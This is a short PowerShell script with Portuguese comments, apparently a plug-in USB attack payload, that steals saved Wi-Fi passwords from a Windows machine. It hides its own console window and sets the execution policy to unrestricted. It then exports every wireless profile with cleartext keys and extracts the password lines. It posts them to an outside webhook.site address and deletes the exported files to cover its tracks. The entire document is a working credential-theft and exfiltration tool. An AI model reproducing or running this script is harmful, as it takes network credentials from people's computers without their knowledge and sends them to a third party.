# Esconde a janela do PowerShell
Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")] 
    public static extern IntPtr GetConsoleWindow();  
    [DllImport("User32.dll")] 
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); 
'

$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)  # 0 = Oculto, 5 = Visível

# A partir daqui, o restante do script pode ser executado normalmente
set-ExecutionPolicy unrestricted -Force
Set-WinUserLanguageList en-US -Force
net start wlansvc
$env:TEMP
netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
Invoke-WebRequest -Uri "https://webhook.site/35192f97-171d-428f-b03e-33726a40cde1" -Method POST -InFile Wi-Fi-PASS
Remove-Item Wi-* -Force -Recurse
Set-WinUserLanguageList pt-BR -Force
exit
